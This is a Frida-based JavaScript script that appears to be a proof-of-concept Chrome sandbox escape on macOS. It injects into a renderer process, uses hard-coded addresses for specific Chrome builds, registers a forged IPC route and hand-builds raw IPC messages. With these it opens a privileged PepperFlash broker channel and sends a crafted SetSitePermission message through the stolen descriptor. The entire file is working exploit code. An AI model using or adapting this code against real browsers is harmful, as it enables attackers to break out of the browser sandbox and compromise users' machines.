var ab = new ArrayBuffer(0x200000);
var dv = new DataView(ab);
var curPos;

function assert(b) {
  if (!b)
    throw 'assertion failed';
}
function notUndef(x) {
  if (x === undefined)
    throw 'undef!';
  return x;
}
function w64(x) {
  assert(x <= 0xffffffff);
  w32(x);
  w32(0);
}
function w32(x) {
  dv.setUint32(curPos, x, true);
  curPos += 4;
}
function w16(x) {
  dv.setUint16(curPos, x, true);
  curPos += 2;
}
function w8(x) {
  dv.setUint8(curPos, x);
  curPos++;
}
function wIPCBool(b) { w8(b ? 1 : 0); }
function wIPCString(s) {
  w32(s.length);
  for (var i = 0; i < s.length; i++)
    w8(s.charCodeAt(i));
  while (curPos & 3)
    w8(0);
}
function wIPCString16(s) {
  w32(s.length);
  for (var i = 0; i < s.length; i++)
    w16(s.charCodeAt(i));
}
function wMessageHeader(size, type, etc) {
  etc = etc || {};
  w32(size);                      // payload_size
  w32(etc.routing || 2147483647); // routing
  w32(type);                      // type
  w32(etc.flags || 0);            // flags
  w32(0);                         // num_brokered_attachments
  w16(0);                         // num_fds
  w16(0);                         // pad
}

function wMessage(id, func, etc) {
  curPos = 0;
  var headerPos = curPos;
  wMessageHeader(0, 0);
  var start = curPos;
  func();
  var end = curPos;
  curPos = 0;
  wMessageHeader(end - start, id, etc);
  return ab.slice(0, end);
}

function sendMessage(id, func, etc) { sendMessageBuf(wMessage(id, func, etc)); }

function sendMessageBuf(sab) {
  if (thisVer.wrapsIPCInEightLayersOfHeaders) {
    // I was originally going to send this manually like the
    // other case and wrote code for all 8 headers, but there
    // are two different fields that have to be fetched from
    // native code and blah
    var fakeMsg = calloc(0x200 + sab.byteLength, 1);
    var vtable = fakeMsg.add(0x100);
    var fakeMsgData = fakeMsg.add(0x200);
    Memory.writePointer(fakeMsg, vtable);
    Memory.writePointer(fakeMsg.add(notUndef(offsets.IPCMessage_header)),
                        fakeMsgData);
    Memory.writeULong(fakeMsg.add(notUndef(offsets.IPCMessage_header_size)),
                      notUndef(offsets.ipcHeader_sizeof));
    Memory.writeLong(
        fakeMsg.add(notUndef(offsets.IPCMessage_capacity_after_header)), -1);
    Memory.writePointer(
        fakeMsg.add(notUndef(offsets.IPCSyncMessage_deserializer)), fakeMsg);
    var su8 = new Uint8Array(sab);
    Memory.writeByteArray(fakeMsgData, sab);

    var vtFuncs = {
      dtor0 : 0,
      dtor8 : 8,
      deserialize : 0x10,
      HasAttachments : 0x20,
    };

    for (var name in vtFuncs) {
      (function(name) {
        var cb = new NativeCallback(function() {
          // console.log('cb called: ' + name);
          return 0;
        }, 'ulong', []);
        Memory.writePointer(vtable.add(vtFuncs[name]), cb);
      })(name);
    }
    // childThreadImpl should have already been set
    var x = childThreadSend(childThreadImpl, fakeMsg);
    // console.log('send ->', x);
  } else
    return new UnixOutputStream(3).writeAll(sab);
}

var _50_0_2661_94 = {
  addrs : {
    childThreadImplCurrent : 0x43ebde0,
    childThreadImplGetRouter : 0x43edb00,
    messageRouterAddRoute : 0xfd0640,
  },
  messageNums : {
    // also ipc/ipc_message_start.h
    // content/common/frame_messages.h
    FrameHostMsg_OpenChannelToPpapiBroker : 0x1049f,
    // content/common/view_messages.h
    ViewMsg_PpapiBrokerChannelCreated : 0x2034c,
    // chrome/common/render_messages.h
    ChromeViewHostMsg_GetPluginInfo : 0x27017b,
    // ppapi/proxy/ppapi_messages.h
    PpapiMsg_SetSitePermission : 0x100258,
  },
};
var _52_0_2729_0 = {
  wrapsIPCInEightLayersOfHeaders : true,
  addrs : {
    childThreadImplCurrent : 0x3cca470,
    childThreadImplGetRouter : 0x3ccc360,
    messageRouterAddRoute : 0x117a400,
  },
  messageNums : {
    FrameHostMsg_OpenChannelToPpapiBroker : 0x104a9,
    ViewMsg_PpapiBrokerChannelCreated : 0x3031a,
    ChromeViewHostMsg_GetPluginInfo : 0x260177,
    PpapiMsg_SetSitePermission : 0xf0258,
  },
};
var offsets = {
  IPCMessage_header : 0x8,
  IPCMessage_header_size : 0x10,
  IPCMessage_capacity_after_header : 0x18,
  IPCMessage_attachment_set : 0x30,
  IPCSyncMessage_deserializer : 0x40,
  ipcHeader_type : 0x8,
  ipcHeader_sizeof : 0x18,
  MessageAttachmentSet_attachments : 0x8,
  PlatformFileAttachment_file : 0x10,

  ChildThread_vt_Send : 0x48,
  MessageAttachment_vt_TakePlatformFile : 0x18,
};

var thisVer = _52_0_2729_0;
var addrs = thisVer.addrs, messageNums = thisVer.messageNums;

var slide = Module.findBaseAddress('Google Chrome Framework') ||
            Module.findBaseAddress('Chromium Framework');
for (var addr in addrs)
  addrs[addr] = slide.add(addrs[addr]);

var childThreadImplCurrent =
    new NativeFunction(addrs.childThreadImplCurrent, 'pointer', []);
var childThreadImplGetRouter = new NativeFunction(
    addrs.childThreadImplGetRouter, 'pointer', [ 'pointer' ]);
var messageRouterAddRoute = new NativeFunction(
    addrs.messageRouterAddRoute, 'uchar', [ 'pointer', 'int32', 'pointer' ]);

var dispatch_sync_f =
    new NativeFunction(Module.findExportByName(null, 'dispatch_sync_f'), 'void',
                       [ 'pointer', 'pointer', 'pointer' ]);
var _dispatch_main_q = Module.findExportByName(null, '_dispatch_main_q');
assert(!_dispatch_main_q.isNull());
var _NSGetArgv = new NativeFunction(Module.findExportByName(null, '_NSGetArgv'),
                                    'pointer', []);
var dup =
    new NativeFunction(Module.findExportByName(null, 'dup'), 'int', [ 'int' ]);
var calloc = new NativeFunction(Module.findExportByName(null, 'calloc'),
                                'pointer', [ 'ulong', 'ulong' ]);

var argv0_addr = Memory.readPointer(Memory.readPointer(_NSGetArgv()));
var argv0 = Memory.readUtf8String(argv0_addr);
// console.log(argv0);
var plugin_path = argv0.replace(
    /Helper\.app.*/,
    'Framework.framework/Internet Plug-Ins/PepperFlash/PepperFlashPlayer.plugin');
assert(plugin_path != argv0);
// console.log(plugin_path);

function childThreadSend(thread, msg) {
  var vt = Memory.readPointer(thread);
  var fp = Memory.readPointer(vt.add(notUndef(offsets.ChildThread_vt_Send)));
  assert(!fp.isNull());
  var f = new NativeFunction(fp, 'uchar', [ 'pointer', 'pointer' ]);
  return f(thread, msg);
}
function messageAttachmentTakePlatformFile(attachment) {
  var vt = Memory.readPointer(attachment);
  var fp = Memory.readPointer(
      vt.add(notUndef(offsets.MessageAttachment_vt_TakePlatformFile)));
  assert(!fp.isNull());
  var f = new NativeFunction(fp, 'uint', [ 'pointer' ]);
  return f(attachment);
}

var routing = ((Math.random() * 1000000) | 0) + 100000;

function talkToBroker(fd) {
  var osBroker = new UnixOutputStream(fd);
  console.log('go!', fd);

  var msg =
      wMessage(notUndef(messageNums.PpapiMsg_SetSitePermission), function() {
        w32(123);                         // request_id
        wIPCString('/net/127.0.0.1/foo'); // plugin_data_path
        w32(0);                           // setting_type =
                                          // PP_FLASH_BROWSEROPERATIONS_SETTINGTYPE_CAMERAMIC
        w32(1);                           // sites.size()
        wIPCString('somesite');           // sites[0].site
        w32(2);                           // sites[0].permission =
                                          // PP_FLASH_BROWSEROPERATIONS_PERMISSION_BLOCK
      });

  console.log(msg.byteLength);
  osBroker.writeAll(msg);
}

function OnMessageReceived(self, message) {
  // message->attachment_set_->attachments_.data()[0].file_
  var header =
      Memory.readPointer(message.add(notUndef(offsets.IPCMessage_header)));
  var type = Memory.readU32(header.add(notUndef(offsets.ipcHeader_type)));
  // console.log('->', (type / 0x10000)|0, type % 0x10000);
  if (type != notUndef(messageNums.ViewMsg_PpapiBrokerChannelCreated)) {
    console.log('got unexpected message');
    return 0;
  }
  var pid = Memory.readU32(header.add(notUndef(offsets.ipcHeader_sizeof)));
  console.log('pid:', pid);
  if (!pid)
    return 0;

  var attachmentSet = Memory.readPointer(
      message.add(notUndef(offsets.IPCMessage_attachment_set)));
  var attachmentsVector =
      attachmentSet.add(notUndef(offsets.MessageAttachmentSet_attachments));
  var attachmentsStart = Memory.readPointer(attachmentsVector);
  var attachmentsEnd = Memory.readPointer(attachmentsVector.add(8));
  assert(attachmentsEnd.equals(attachmentsStart.add(8)));
  var attachment = Memory.readPointer(attachmentsStart);
  var fd = messageAttachmentTakePlatformFile(attachment);
  console.log('fd:', fd);
  var fd2 = dup(fd);

  setTimeout(function() { talkToBroker(fd2); }, 0);

  return 0;
}
function work1() {
  addRoute();
  getPluginInfo();
}
function addRoute() {
  var listenerVtableSize = 1024;
  var listenerVtable = calloc(listenerVtableSize, 1);
  Memory.writePointer(
      listenerVtable,
      new NativeCallback(OnMessageReceived, 'uchar', [ 'pointer', 'pointer' ]));

  var listenerSize = 1024;
  var listener = calloc(listenerSize, 1);
  Memory.writePointer(listener, listenerVtable);

  childThreadImpl = childThreadImplCurrent();
  assert(!childThreadImpl.isNull());
  var router = childThreadImplGetRouter(childThreadImpl);
  assert(!router.isNull());
  var res = messageRouterAddRoute(router, routing, listener);
  assert(res);
  console.log('added route');
}

function getPluginInfo() {
  curPos = 0;
  sendMessage(
      notUndef(messageNums.ChromeViewHostMsg_GetPluginInfo), function() {
        w32(11111);                                  // syncheader message_id
        w32(1000);                                   // render_frame_id
        wIPCString('https://google.com');            // url
        wIPCString('https://google.com');            // top_origin_url
        wIPCString('application/x-shockwave-flash'); // mime_type
      }, {
        flags : 4 /*SYNC_BIT*/
      });
  console.log('wrote get-plugin-info');
}
function work2() {
  var x = sendMessage(
      notUndef(messageNums.FrameHostMsg_OpenChannelToPpapiBroker), function() {
        w32(routing);
        wIPCString(plugin_path);
      });
  console.log('wrote open-channel');
}
dispatch_sync_f(_dispatch_main_q, ptr('0'),
                new NativeCallback(work1, 'void', [ 'pointer' ]));
setTimeout(function() {
  dispatch_sync_f(_dispatch_main_q, ptr('0'),
                  new NativeCallback(work2, 'void', [ 'pointer' ]))
}, 200);
